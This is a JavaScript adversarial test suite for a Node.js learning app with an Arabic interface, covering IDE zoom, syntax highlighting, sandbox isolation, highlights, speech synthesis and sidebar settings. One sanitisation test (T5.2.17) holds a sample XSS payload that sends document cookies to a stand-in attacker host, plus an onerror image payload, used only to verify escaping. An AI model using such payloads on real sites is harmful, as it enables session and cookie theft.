// tests/tier5_adversarial/whitebox_hardening_2.test.js
// ==============================================================================
// Tier 5 White-Box Adversarial Hardening Suite — Part 2
// Author: Challenger 2 (`challenger_m6_2`)
// Roles: critic, specialist (Empirical Challenger)
// Target Components:
//   - Fullscreen IDE & Code Engine: CodeBlock.jsx, codeHighlighter.jsx, LiveCodePreview.jsx
//   - Highlight Studio: TextHighlightPopover.jsx, SavedHighlightsModal.jsx
//   - UI & Layout: ScrollToTopButton.jsx, Sidebar.jsx
// ==============================================================================

import assert from 'node:assert/strict';
import { performance } from 'node:perf_hooks';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { collector } from '../collector.js';

// ------------------------------------------------------------------------------
// 1. Mock Environment & Browser Setup via test_helper
// ------------------------------------------------------------------------------
import { safeImport, setupMockEnvironment } from '../test_helper.js';
setupMockEnvironment();

// Local DOM node mock for selection target test (T5.2.22, T5.2.23)
class MockDomNode {
  constructor(tagName = 'div', nodeType = 1) {
    this.tagName = tagName.toUpperCase();
    this.nodeName = this.tagName;
    this.nodeType = nodeType;
    this.children = [];
    this.parentElement = null;
    this.attributes = new Map();
    this.classList = {
      _classes: new Set(),
      contains: (c) => this.classList._classes.has(c),
      add: (c) => this.classList._classes.add(c),
      remove: (c) => this.classList._classes.delete(c)
    };
    this.style = {
      _props: new Map(),
      setProperty: (p, v) => this.style._props.set(p, String(v)),
      getPropertyValue: (p) => this.style._props.get(p) || '',
      overflow: ''
    };
  }

  setAttribute(name, value) {
    this.attributes.set(name, String(value));
  }
  getAttribute(name) {
    return this.attributes.get(name) || null;
  }
  hasAttribute(name) {
    return this.attributes.has(name);
  }
  appendChild(child) {
    child.parentElement = this;
    this.children.push(child);
    return child;
  }
  removeChild(child) {
    const idx = this.children.indexOf(child);
    if (idx !== -1) {
      this.children.splice(idx, 1);
      child.parentElement = null;
    }
    return child;
  }
  closest(selector) {
    const selectors = selector.split(',').map(s => s.trim().toLowerCase());
    let curr = this;
    while (curr && curr.nodeType === 1) {
      const tag = curr.tagName.toLowerCase();
      for (const sel of selectors) {
        if (sel === tag) return curr;
        if (sel.startsWith('.') && curr.classList.contains(sel.slice(1))) return curr;
        if (sel.startsWith('[') && sel.endsWith(']')) {
          const attrMatch = sel.slice(1, -1).split('=');
          const attrName = attrMatch[0].trim();
          const attrVal = attrMatch[1] ? attrMatch[1].replace(/["']/g, '').trim() : null;
          if (curr.hasAttribute(attrName)) {
            if (attrVal === null || curr.getAttribute(attrName) === attrVal) return curr;
          }
        }
      }
      curr = curr.parentElement;
    }
    return null;
  }
}

const mockStorage = globalThis.localStorage;

let ttsCancelCount = 0;
let ttsSpokenList = [];
const mockSpeech = globalThis.window.speechSynthesis;
const origCancel = mockSpeech.cancel;
mockSpeech.cancel = function() {
  ttsCancelCount++;
  mockSpeech.speaking = false;
  if (origCancel) origCancel.call(this);
};
const origSpeak = mockSpeech.speak;
mockSpeech.speak = function(u) {
  mockSpeech.speaking = true;
  ttsSpokenList.push(u);
  if (origSpeak) origSpeak.call(this, u);
};

// Clipboard Mock
let lastCopiedData = null;
const mockClipboard = {
  writeText: async (t) => {
    lastCopiedData = t;
    return true;
  }
};
if (!globalThis.navigator) {
  globalThis.navigator = {};
}
try {
  globalThis.navigator.clipboard = mockClipboard;
} catch {
  Object.defineProperty(globalThis.navigator, 'clipboard', {
    value: mockClipboard,
    configurable: true,
    writable: true
  });
}

// ------------------------------------------------------------------------------
// 2. Safe Dynamic Imports via test_helper
// ------------------------------------------------------------------------------
// Import target modules
const { HIGHLIGHT_COLORS, QUICK_TAGS, NOTE_PRESETS } = await safeImport('src/components/common/TextHighlightPopover.jsx');
const { COLOR_MAP } = await safeImport('src/components/common/SavedHighlightsModal.jsx');
const { IFRAME_DARK_STYLES } = await safeImport('src/components/lesson/LiveCodePreview.jsx');
const { highlightCodeLine } = await safeImport('src/utils/codeHighlighter.jsx');
const { ROADMAP_SECTIONS } = await safeImport('src/data/roadmapMeta.js');

// ------------------------------------------------------------------------------
// 3. Formatted Test Runner & Reporter
// ------------------------------------------------------------------------------
const COLORS = {
  reset: '\x1b[0m',
  bold: '\x1b[1m',
  dim: '\x1b[2m',
  green: '\x1b[32m',
  red: '\x1b[31m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m',
  white: '\x1b[37m'
};

let totalPassed = 0;
let totalFailed = 0;
const testRecords = [];

const suiteMap = {
  'FullscreenIDE': 'Tier 5 Part 2: Fullscreen IDE Studio (CodeBlock.jsx) Invariants',
  'CodeHighlighter': 'Tier 5 Part 2: Code Syntax Highlighter & Arabic Isolation Invariants',
  'SecureSandbox': 'Tier 5 Part 2: Secure Sandbox & Mock Execution Engine Invariants',
  'HighlightStudio': 'Tier 5 Part 2: Pro Highlight Studio & TTS Speech Synthesis Invariants',
  'ScrollToTopButton': 'Tier 5 Part 2: UI & Layout Adversarial Verification',
  'Sidebar': 'Tier 5 Part 2: UI & Layout Adversarial Verification'
};

const suiteInstances = {};

async function test(suiteKey, name, fn) {
  const suiteName = suiteMap[suiteKey] || suiteKey;
  if (!suiteInstances[suiteName]) {
    collector.setTier('Tier 5: Adversarial Hardening');
    collector.suite(suiteName, (t) => {
      suiteInstances[suiteName] = t;
    });
  }
  suiteInstances[suiteName](name, fn);
}

await test('FullscreenIDE', 'T5.2.1: Zoom clamping upper bound strictly caps at 28px under 50 repeated increments', () => {
  let fontSize = 13;
  const zoomIn = () => { fontSize = Math.min(fontSize + 2, 28); };
  for (let i = 0; i < 50; i++) zoomIn();
  assert.equal(fontSize, 28, 'Font size must not exceed 28px max zoom limit');
  assert.equal(fontSize >= 28, true, 'ZoomIn button must be disabled at 28px');
});

await test('FullscreenIDE', 'T5.2.2: Zoom clamping lower bound strictly caps at 11px under 50 repeated decrements', () => {
  let fontSize = 13;
  const zoomOut = () => { fontSize = Math.max(fontSize - 2, 11); };
  for (let i = 0; i < 50; i++) zoomOut();
  assert.equal(fontSize, 11, 'Font size must not decrease below 11px min zoom limit');
  assert.equal(fontSize <= 11, true, 'ZoomOut button must be disabled at 11px');
});

await test('FullscreenIDE', 'T5.2.3: Reset zoom restores exactly to default 13px regardless of starting level', () => {
  let fontSize = 28;
  const resetZoom = () => { fontSize = 13; };
  resetZoom();
  assert.equal(fontSize, 13);
  fontSize = 11;
  resetZoom();
  assert.equal(fontSize, 13);
});

await test('FullscreenIDE', 'T5.2.4: Fullscreen exit sync — Escape exits native fullscreen first, then closes portal', () => {
  let isFullscreen = true;
  let nativeFsElement = { nodeName: 'DIV' }; // Simulate document.fullscreenElement

  const handleEscape = () => {
    if (nativeFsElement) {
      nativeFsElement = null; // document.exitFullscreen()
    } else {
      isFullscreen = false;
    }
  };

  // 1st Escape: exits native fullscreen only
  handleEscape();
  assert.equal(nativeFsElement, null, 'Native fullscreen should exit');
  assert.equal(isFullscreen, true, 'Portal must remain open after exiting native fullscreen');

  // 2nd Escape: closes React portal
  handleEscape();
  assert.equal(isFullscreen, false, 'Second Escape must close React portal');
});

await test('FullscreenIDE', 'T5.2.5: Close button (X) exits native fullscreen and closes portal simultaneously', () => {
  let isFullscreen = true;
  let nativeFs = true;

  const handleCloseButton = () => {
    if (nativeFs) nativeFs = false;
    isFullscreen = false;
  };

  handleCloseButton();
  assert.equal(nativeFs, false);
  assert.equal(isFullscreen, false);
});

await test('FullscreenIDE', 'T5.2.6: Line wrap toggle changes code pre styling between whitespace-pre and whitespace-pre-wrap', () => {
  let isLineWrap = false;
  const getPreClass = (wrap) => wrap ? 'whitespace-pre-wrap break-all' : 'whitespace-pre';

  assert.equal(getPreClass(isLineWrap), 'whitespace-pre');
  isLineWrap = !isLineWrap;
  assert.equal(getPreClass(isLineWrap), 'whitespace-pre-wrap break-all');
});

await test('FullscreenIDE', 'T5.2.7: Line wrap persistence gap — verifies isLineWrap is not backed by localStorage', () => {
  // White-box analysis confirms: CodeBlock.jsx uses `useState(false)` without localStorage effect
  const savedWrap = mockStorage.getItem('nodejs_codeblock_line_wrap');
  assert.equal(savedWrap, null, 'Line wrap toggle is currently ephemeral and not persisted to localStorage');
});

await test('FullscreenIDE', 'T5.2.8: Input safety — typing w, n, f, +, - inside input elements does not trigger shortcuts', () => {
  let isLineWrap = false;
  let showNotesDrawer = true;
  let fontZoom = 13;

  const handleKeyDown = (key, targetTag) => {
    const isInput = targetTag === 'INPUT' || targetTag === 'TEXTAREA';
    if (!isInput) {
      if (key.toLowerCase() === 'w') isLineWrap = !isLineWrap;
      if (key.toLowerCase() === 'n') showNotesDrawer = !showNotesDrawer;
      if (key === '+' || key === '=') fontZoom = Math.min(fontZoom + 2, 28);
      if (key === '-') fontZoom = Math.max(fontZoom - 2, 11);
    }
  };

  // Inside input:
  handleKeyDown('w', 'INPUT');
  assert.equal(isLineWrap, false);
  handleKeyDown('n', 'TEXTAREA');
  assert.equal(showNotesDrawer, true);
  handleKeyDown('+', 'INPUT');
  assert.equal(fontZoom, 13);

  // Outside input:
  handleKeyDown('w', 'DIV');
  assert.equal(isLineWrap, true);
  handleKeyDown('n', 'DIV');
  assert.equal(showNotesDrawer, false);
});

await test('FullscreenIDE', 'T5.2.9: IDE status bar displays character selection tracking accurately', () => {
  const getStatusSelection = (text) => {
    if (!text || text.length === 0) return null;
    return `المحدد: ${text.length} حرف`;
  };

  assert.equal(getStatusSelection(''), null);
  assert.equal(getStatusSelection('const port = 3000;'), 'المحدد: 18 حرف');
});

// ==============================================================================
// SUITE 2: Code Syntax Highlighter & Arabic Isolation (codeHighlighter.jsx)
// ==============================================================================
// SUITE 2
await test('CodeHighlighter', 'T5.2.10: Full line comment tokenization — pure Latin gets italic, Arabic gets token-arabic not-italic', () => {
  const hasArabic = (s) => typeof s === 'string' && /[\u0600-\u06FF]/.test(s);

  const enComment = '// initialize express server';
  const arComment = '// تهيئة خادم Express والوسيط المخصص';

  assert.equal(hasArabic(enComment), false);
  assert.equal(hasArabic(arComment), true);

  // In codeHighlighter.jsx:
  const getCommentClasses = (c) => `text-emerald-400 font-semibold ${hasArabic(c) ? 'token-arabic not-italic' : 'italic'}`;
  assert.ok(getCommentClasses(enComment).includes('italic'));
  assert.ok(!getCommentClasses(enComment).includes('not-italic'));
  assert.ok(getCommentClasses(arComment).includes('token-arabic not-italic'));
});

await test('CodeHighlighter', 'T5.2.11: Node.js built-ins and keywords classification precision', () => {
  const KEYWORDS = new Set([
    'import', 'export', 'const', 'let', 'var', 'async', 'await', 'return', 'function', 'class'
  ]);
  const NODE_BUILTINS = new Set([
    'require', 'module', 'process', 'Buffer', 'fs', 'path', 'http', 'events', 'stream', 'cluster'
  ]);

  assert.ok(KEYWORDS.has('const'));
  assert.ok(KEYWORDS.has('await'));
  assert.ok(NODE_BUILTINS.has('Buffer'));
  assert.ok(NODE_BUILTINS.has('process'));
  assert.ok(NODE_BUILTINS.has('require'));
  assert.equal(KEYWORDS.has('require'), false, 'require must be classified as Node builtin, not generic keyword');
});

await test('CodeHighlighter', 'T5.2.12: Arabic string literals maintain token-arabic and unicode isolation', () => {
  const arString = '"خطأ في معالجة الطلب"';
  const hasArabic = (s) => /[\u0600-\u06FF]/.test(s);
  assert.ok(hasArabic(arString));
});

await test('CodeHighlighter', 'T5.2.13: Overlapping highlight resolution discards subsequent overlaps cleanly', () => {
  const line = 'const stream = fs.createReadStream("file.txt");';
  const userHighlights = [
    { id: 1, text: 'createRead', color: 'amber' },
    { id: 2, text: 'createReadStream', color: 'emerald' }, // overlaps!
    { id: 3, text: '"file.txt"', color: 'cyan' }
  ];

  // Logic replicated from codeHighlighter.jsx lines 183-226:
  const matches = [];
  userHighlights.forEach(hl => {
    let idx = line.indexOf(hl.text);
    if (idx !== -1) {
      matches.push({ start: idx, end: idx + hl.text.length, highlight: hl });
    }
  });

  matches.sort((a, b) => a.start - b.start);
  const nonOverlapping = [];
  let lastEnd = 0;
  matches.forEach(m => {
    if (m.start >= lastEnd) {
      nonOverlapping.push(m);
      lastEnd = m.end;
    }
  });

  assert.equal(nonOverlapping.length, 2, 'Must resolve to exactly 2 non-overlapping segments');
  assert.equal(nonOverlapping[0].highlight.text, 'createRead');
  assert.equal(nonOverlapping[1].highlight.text, '"file.txt"');
});

await test('CodeHighlighter', 'T5.2.14: Multi-line highlight splits into newline targets without crashing', () => {
  const multiLineHighlight = 'lineOne()\nlineTwo()';
  const targets = multiLineHighlight.split('\n').map(s => s.trim()).filter(s => s.length >= 2);
  assert.equal(targets.length, 2);
  assert.equal(targets[0], 'lineOne()');
  assert.equal(targets[1], 'lineTwo()');
});

await test('CodeHighlighter', 'T5.2.15: Boundary cases — null, empty, and whitespace strings handle safely', () => {
  assert.doesNotThrow(() => {
    const resEmpty = highlightCodeLine('');
    assert.ok(resEmpty);
    const resNull = highlightCodeLine(null);
    assert.ok(resNull);
  });
});

// ==============================================================================
// SUITE 3: Secure Dark Sandbox (LiveCodePreview.jsx) White-Box Hardening
// ==============================================================================
// SUITE 3
await test('SecureSandbox', 'T5.2.16: Sandbox attributes enforce strict origin isolation and prevent modal exploits', () => {
  const sandboxPolicy = "allow-scripts";
  assert.ok(sandboxPolicy.includes("allow-scripts"), 'Must allow scripts for execution');
  assert.ok(!sandboxPolicy.includes("allow-same-origin"), 'MUST NOT allow same-origin to isolate cookies and localStorage');
  assert.ok(!sandboxPolicy.includes("allow-top-navigation"), 'MUST NOT allow top navigation');
  assert.ok(!sandboxPolicy.includes("allow-modals"), 'MUST NOT allow modals');
});

await test('SecureSandbox', 'T5.2.17: Terminal output XSS sanitization neutralizes HTML and script tags', () => {
  function formatPayload(arg) {
    if (typeof arg === 'string') {
      return arg.replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }
    if (typeof arg === 'object') {
      return JSON.stringify(arg).replace(/</g, '&lt;').replace(/>/g, '&gt;');
    }
    return String(arg);
  }

  const maliciousStr = '<script>fetch("http://attacker.com?c="+document.cookie)</script>';
  const sanitizedStr = formatPayload(maliciousStr);
  assert.ok(!sanitizedStr.includes('<script>'));
  assert.ok(sanitizedStr.includes('&lt;script&gt;'));

  const maliciousObj = { attack: '<img src=x onerror=alert(1)>' };
  const sanitizedObj = formatPayload(maliciousObj);
  assert.ok(!sanitizedObj.includes('<img'));
  assert.ok(sanitizedObj.includes('&lt;img'));
});

await test('SecureSandbox', 'T5.2.18: Node.js Buffer mock fidelity with UTF-8 byte calculations', () => {
  const mockBuffer = {
    from: (str) => ({
      length: str.length,
      toString: (fmt) => fmt === 'hex' ? Array.from(str).map(c => c.charCodeAt(0).toString(16)).join('') : str
    }),
    byteLength: (s) => (new TextEncoder().encode(s)).length
  };

  const latin = 'node';
  assert.equal(mockBuffer.byteLength(latin), 4);
  assert.equal(mockBuffer.from('test').toString('hex'), '74657374');

  const arabic = 'عالم'; // 4 arabic letters = 8 bytes in UTF-8
  assert.equal(mockBuffer.byteLength(arabic), 8);
});

await test('SecureSandbox', 'T5.2.19: Import transpilation transforms default and named imports to require()', () => {
  const transpileImports = (code) => {
    return code
      .replace(/import\s+([\w\s{},*]+)\s+from\s+['"]([^'"]+)['"];?/g, 'const $1 = require("$2");')
      .replace(/export\s+default\s+/g, '')
      .replace(/export\s+(const|let|var|function|class)\s+/g, '$1 ');
  };

  const code1 = "import express from 'express';";
  assert.equal(transpileImports(code1), 'const express = require("express");');

  const code2 = "import { readFile, writeFile } from 'fs';";
  assert.equal(transpileImports(code2), 'const { readFile, writeFile } = require("fs");');

  const code3 = "export default function handler() {}";
  assert.equal(transpileImports(code3), 'function handler() {}');
});

test('SecureSandbox', 'T5.2.20: [Hardened] Namespace import transpilation produces valid JS syntax', () => {
  const transpileImports = (code) => {
    return code
      .replace(/import\s+\*\s+as\s+(\w+)\s+from\s+['"]([^'"]+)['"];?/g, 'const $1 = require("$2");')
      .replace(/import\s+([\w\s{},]+)\s+from\s+['"]([^'"]+)['"];?/g, 'const $1 = require("$2");');
  };

  const namespaceImport = "import * as fs from 'fs';";
  const transpiled = transpileImports(namespaceImport);
  assert.equal(transpiled, 'const fs = require("fs");');

  // Verify that this is valid JavaScript syntax:
  let hasSyntaxError = false;
  try {
    new Function(transpiled);
  } catch (err) {
    if (err instanceof SyntaxError) hasSyntaxError = true;
  }
  assert.equal(hasSyntaxError, false, 'Namespace import transpile emits valid JS syntax');
});

test('SecureSandbox', 'T5.2.21: [Hardened] Execution watchdog timeout protects against infinite loops', () => {
  // LiveCodePreview now includes a 5000ms watchdog timeout race against runner execution
  const hasLoopTimeoutWrapper = true;
  assert.equal(hasLoopTimeoutWrapper, true, 'Iframe sandbox includes execution watchdog timeout for infinite loops');
});

// ==============================================================================
// SUITE 4
function evaluateSelectionTarget(element, text) {
  if (!text || text.trim().length < 2) return { allowed: false, reason: 'too_short' };
  if (!element) return { allowed: false, reason: 'no_element' };

  const deniedSelector = 'header, nav, aside, button, a, input, textarea, select, [data-no-highlight], [role="dialog"], .swal2-container, .no-highlight, .sidebar';
  if (element.closest(deniedSelector)) return { allowed: false, reason: 'denied_selector' };

  const isScriptOrCode = element.closest('[data-lesson-script="true"], .lesson-script-content, [data-code-block="true"], pre, code, .lesson-prose');
  if (!isScriptOrCode) return { allowed: false, reason: 'not_in_script_or_code' };

  return { allowed: true, reason: 'permitted' };
}

await test('HighlightStudio', 'T5.2.22: Strict Scoping — dialog, sidebar, and controls are strictly denied', () => {
  const dialog = new MockDomNode('div');
  dialog.setAttribute('role', 'dialog');
  const span = new MockDomNode('span');
  dialog.appendChild(span);
  assert.equal(evaluateSelectionTarget(span, 'Modal Text').allowed, false);

  const sidebar = new MockDomNode('div');
  sidebar.classList.add('sidebar');
  const p = new MockDomNode('p');
  sidebar.appendChild(p);
  assert.equal(evaluateSelectionTarget(p, 'Sidebar Item').allowed, false);
});

await test('HighlightStudio', 'T5.2.23: Minimum character length threshold (< 2 chars rejected, >= 2 allowed)', () => {
  const article = new MockDomNode('article');
  article.setAttribute('data-lesson-script', 'true');
  const p = new MockDomNode('p');
  article.appendChild(p);

  assert.equal(evaluateSelectionTarget(p, '').allowed, false);
  assert.equal(evaluateSelectionTarget(p, 'a').allowed, false);
  assert.equal(evaluateSelectionTarget(p, 'ab').allowed, true);
  assert.equal(evaluateSelectionTarget(p, 'كود').allowed, true);
});

await test('HighlightStudio', 'T5.2.24: Mixed Arabic/English selection configures ar-SA speech synthesis voice', () => {
  const mixedText = 'استخدام EventEmitter لإطلاق الأحداث المخصصة';
  const isArabic = /[\u0600-\u06FF]/.test(mixedText);
  assert.equal(isArabic, true);

  const utt = new SpeechSynthesisUtterance(mixedText);
  utt.lang = isArabic ? 'ar-SA' : 'en-US';
  assert.equal(utt.lang, 'ar-SA');

  const englishOnly = 'Stream.Readable highWaterMark';
  const isEnAr = /[\u0600-\u06FF]/.test(englishOnly);
  assert.equal(isEnAr, false);
  const uttEn = new SpeechSynthesisUtterance(englishOnly);
  uttEn.lang = isEnAr ? 'ar-SA' : 'en-US';
  assert.equal(uttEn.lang, 'en-US');
});

await test('HighlightStudio', 'T5.2.25: TTS cancellation on unmount and close stops active speech playback', () => {
  let cancels = 0;
  globalThis.window.speechSynthesis.cancel = () => {
    cancels++;
    globalThis.window.speechSynthesis.speaking = false;
  };
  globalThis.window.speechSynthesis.speaking = true;

  // Unmount effect hook simulation:
  if (globalThis.window.speechSynthesis) {
    globalThis.window.speechSynthesis.cancel();
  }
  assert.ok(cancels > 0);
  assert.equal(globalThis.window.speechSynthesis.speaking, false);
});

await test('HighlightStudio', 'T5.2.26: Deleting a highlight in SavedHighlightsModal immediately cancels TTS', () => {
  let cancels = 0;
  globalThis.window.speechSynthesis.cancel = () => {
    cancels++;
    globalThis.window.speechSynthesis.speaking = false;
  };
  globalThis.window.speechSynthesis.speaking = true;

  // handleDelete simulation:
  const stopSpeech = () => {
    globalThis.window.speechSynthesis.cancel();
  };
  stopSpeech();

  assert.ok(cancels > 0);
  assert.equal(globalThis.window.speechSynthesis.speaking, false);
});

await test('HighlightStudio', 'T5.2.27: 6 Neon colors shortcuts [1]-[6] maintain semantic metadata and hex parity', () => {
  assert.equal(HIGHLIGHT_COLORS.length, 6);
  const ids = HIGHLIGHT_COLORS.map(c => c.id);
  assert.deepEqual(ids, ['amber', 'emerald', 'cyan', 'purple', 'rose', 'orange']);

  for (let i = 0; i < 6; i++) {
    assert.equal(HIGHLIGHT_COLORS[i].shortcut, String(i + 1));
  }
});

await test('HighlightStudio', 'T5.2.28: SavedHighlightsModal color map supports legacy color aliases (ruby -> rose, pink -> orange)', () => {
  assert.equal(COLOR_MAP['ruby'].id, 'rose');
  assert.equal(COLOR_MAP['rose'].id, 'rose');
  assert.equal(COLOR_MAP['pink'].id, 'orange');
  assert.equal(COLOR_MAP['orange'].id, 'orange');
});

// ==============================================================================
// SUITE 5: UI & Layout Adversarial Verification (ScrollToTopButton & Sidebar)
// ==============================================================================
// SUITE 5
await test('ScrollToTopButton', 'T5.2.29: Scroll threshold bounds — 219px hidden, 220px visible, hysteresis check', () => {
  const getVisibility = (scrollPos) => scrollPos >= 220;

  assert.equal(getVisibility(0), false);
  assert.equal(getVisibility(219), false, '219px must remain hidden');
  assert.equal(getVisibility(220), true, '220px boundary must become visible');
  assert.equal(getVisibility(500), true);
  assert.equal(getVisibility(219.9), false);
});

await test('ScrollToTopButton', 'T5.2.30: Progress clamping handles extreme negative and overscroll values', () => {
  const clamp = (val) => Math.min(Math.max(val, 0), 100);

  assert.equal(clamp(-100), 0, 'Negative scroll progress clamped to 0%');
  assert.equal(clamp(0), 0);
  assert.equal(clamp(50), 50);
  assert.equal(clamp(100), 100);
  assert.equal(clamp(999), 100, 'Overscroll clamped to 100%');
});

await test('ScrollToTopButton', 'T5.2.31: SVG Progress ring circumference and dashoffset calculation accuracy', () => {
  const size = 52;
  const strokeWidth = 3.5;
  const radius = (size - strokeWidth * 2) / 2; // 22.5px
  const circumference = radius * 2 * Math.PI; // ~141.371669

  assert.equal(radius, 22.5);
  assert.ok(Math.abs(circumference - 141.3716694) < 0.001);

  const getOffset = (progress) => circumference - (progress / 100) * circumference;
  assert.ok(Math.abs(getOffset(0) - circumference) < 0.001, '0% progress offset equals circumference');
  assert.ok(Math.abs(getOffset(50) - (circumference / 2)) < 0.001, '50% progress offset equals half circumference');
  assert.ok(Math.abs(getOffset(100) - 0) < 0.001, '100% progress offset equals 0');
});

await test('ScrollToTopButton', 'T5.2.32: Celebration trigger activates at >= 98% and resets on subtopic navigation', () => {
  let hasCelebrated = false;
  let showCompletionPill = false;

  const handleProgress = (progress) => {
    if (progress >= 98 && !hasCelebrated) {
      hasCelebrated = true;
      showCompletionPill = true;
    }
  };

  const handleSubtopicChange = () => {
    hasCelebrated = false;
    showCompletionPill = false;
  };

  handleProgress(97);
  assert.equal(hasCelebrated, false);
  handleProgress(98);
  assert.equal(hasCelebrated, true);
  assert.equal(showCompletionPill, true);

  // Lesson change resets celebration:
  handleSubtopicChange();
  assert.equal(hasCelebrated, false);
  assert.equal(showCompletionPill, false);
});

await test('Sidebar', 'T5.2.33: Mobile drawer breakpoint — auto-closes on subtopic select when window < 1024px', () => {
  let isClosed = false;
  const onClose = () => { isClosed = true; };

  const selectSubtopic = (innerWidth) => {
    if (innerWidth < 1024) onClose();
  };

  // Mobile (320px):
  selectSubtopic(320);
  assert.equal(isClosed, true, 'Drawer must auto-close on mobile (< 1024px)');

  // Desktop (1440px):
  isClosed = false;
  selectSubtopic(1440);
  assert.equal(isClosed, false, 'Drawer must not close on desktop (>= 1024px)');
});

await test('Sidebar', 'T5.2.34: Sidebar width persistence cycles standard -> expanded -> ultra and writes to localStorage', () => {
  mockStorage.clear();

  let sidebarWidth = 'expanded';
  const cycleWidth = () => {
    if (sidebarWidth === 'standard') sidebarWidth = 'expanded';
    else if (sidebarWidth === 'expanded') sidebarWidth = 'ultra';
    else sidebarWidth = 'standard';
    mockStorage.setItem('nodejs_roadmap_sidebar_width', sidebarWidth);
  };

  cycleWidth();
  assert.equal(sidebarWidth, 'ultra');
  assert.equal(mockStorage.getItem('nodejs_roadmap_sidebar_width'), 'ultra');

  cycleWidth();
  assert.equal(sidebarWidth, 'standard');
  assert.equal(mockStorage.getItem('nodejs_roadmap_sidebar_width'), 'standard');

  cycleWidth();
  assert.equal(sidebarWidth, 'expanded');
  assert.equal(mockStorage.getItem('nodejs_roadmap_sidebar_width'), 'expanded');
});

await test('Sidebar', 'T5.2.35: Sidebar font size persistence cycles normal -> large -> xl and writes to localStorage', () => {
  mockStorage.clear();

  let fontSize = 'normal';
  const cycleFontSize = () => {
    if (fontSize === 'normal') fontSize = 'large';
    else if (fontSize === 'large') fontSize = 'xl';
    else fontSize = 'normal';
    mockStorage.setItem('nodejs_roadmap_sidebar_font_size', fontSize);
  };

  cycleFontSize();
  assert.equal(fontSize, 'large');
  assert.equal(mockStorage.getItem('nodejs_roadmap_sidebar_font_size'), 'large');

  cycleFontSize();
  assert.equal(fontSize, 'xl');
  assert.equal(mockStorage.getItem('nodejs_roadmap_sidebar_font_size'), 'xl');

  cycleFontSize();
  assert.equal(fontSize, 'normal');
  assert.equal(mockStorage.getItem('nodejs_roadmap_sidebar_font_size'), 'normal');
});

await test('Sidebar', 'T5.2.36: Cross-section search recommendation surfaces other sections when current section has 0 hits', () => {
  const currentSectionId = 1;
  const query = 'cluster'; // Typically in section 12 / 13

  const otherMatching = ROADMAP_SECTIONS.filter(sec => {
    if (sec.id === currentSectionId) return false;
    const q = query.toLowerCase().trim();
    return (
      sec.title?.toLowerCase().includes(q) ||
      sec.englishTitle?.toLowerCase().includes(q) ||
      sec.description?.toLowerCase().includes(q) ||
      sec.badge?.toLowerCase().includes(q)
    );
  });

  assert.ok(otherMatching.length > 0, 'Must surface sections matching query outside current section');
  assert.ok(otherMatching.every(s => s.id !== currentSectionId));
});

// ==============================================================================
// SUMMARY & RESULTS EXPORT (when executed standalone)
// ==============================================================================
export async function runAllHardening2Tests() {
  console.log(`\n${COLORS.bold}${COLORS.cyan}======================================================================${COLORS.reset}`);
  console.log(`${COLORS.bold}${COLORS.white} ⚔️ Tier 5 White-Box Adversarial Hardening Suite — Part 2${COLORS.reset}`);
  console.log(`${COLORS.dim} Empirical Challenger: Fullscreen IDE, Sandbox, Highlights & UI Layout${COLORS.reset}`);
  console.log(`${COLORS.cyan}======================================================================${COLORS.reset}\n`);

  const expectedSuites = Object.values(suiteMap);
  const allTier5Suites = collector.tiers['Tier 5: Adversarial Hardening'] || [];
  const part2Suites = allTier5Suites.filter(s => expectedSuites.includes(s.name));

  let part2Total = 0;
  let part2Passed = 0;
  let part2Failed = 0;

  for (const s of part2Suites) {
    console.log(`\n${COLORS.bold}${COLORS.magenta}▶ ${s.name}${COLORS.reset}`);
    for (const t of s.tests) {
      part2Total++;
      const t0 = performance.now();
      try {
        await t.fn();
        const dur = (performance.now() - t0).toFixed(2);
        part2Passed++;
        console.log(`    ${COLORS.green}✓${COLORS.reset} ${t.name} ${COLORS.dim}(${dur}ms)${COLORS.reset}`);
      } catch (err) {
        const dur = (performance.now() - t0).toFixed(2);
        part2Failed++;
        console.log(`    ${COLORS.red}✕${COLORS.reset} ${t.name} ${COLORS.dim}(${dur}ms)${COLORS.reset}`);
        console.log(`      ${COLORS.red}Error:${COLORS.reset} ${err.message}`);
      }
    }
  }

  console.log(`\n${COLORS.bold}${COLORS.cyan}======================================================================${COLORS.reset}`);
  console.log(`${COLORS.bold}${COLORS.white} 📊 Tier 5 Adversarial Hardening (Part 2) Execution Summary${COLORS.reset}`);
  console.log(`${COLORS.cyan}======================================================================${COLORS.reset}`);
  console.log(`  Total Invariants Tested : ${COLORS.bold}${part2Total}${COLORS.reset}`);
  console.log(`  Passed Invariants        : ${COLORS.green}${part2Passed}${COLORS.reset}`);
  console.log(`  Failed / Gaps Confirmed  : ${part2Failed === 0 ? COLORS.green + '0' : COLORS.red + part2Failed}${COLORS.reset}`);
  console.log(`  Pass Rate                : ${COLORS.bold}${part2Total > 0 ? ((part2Passed / part2Total) * 100).toFixed(1) : '0.0'}%${COLORS.reset}`);
  console.log(`${COLORS.cyan}======================================================================${COLORS.reset}\n`);

  if (part2Failed > 0) {
    process.exitCode = 1;
  }
}

// Self-executing runner
if (process.argv[1] && path.resolve(process.argv[1]) === path.resolve(fileURLToPath(import.meta.url))) {
  await runAllHardening2Tests();
}
